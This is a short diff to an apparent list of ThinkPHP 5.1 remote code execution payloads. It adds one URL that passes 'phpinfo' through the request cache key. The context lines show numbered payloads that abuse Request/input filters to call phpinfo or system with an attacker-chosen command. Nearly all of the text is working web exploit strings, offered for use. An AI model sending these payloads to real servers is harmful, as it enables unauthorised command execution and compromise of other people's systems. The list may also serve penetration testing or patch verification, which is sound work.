@@ -33,6 +33,8 @@
 # thinkphp 5.1.*
 
 ```
+index.php?s=/index/\think\request/cache&key=1|phpinfo
+
 8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
 
 9、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd
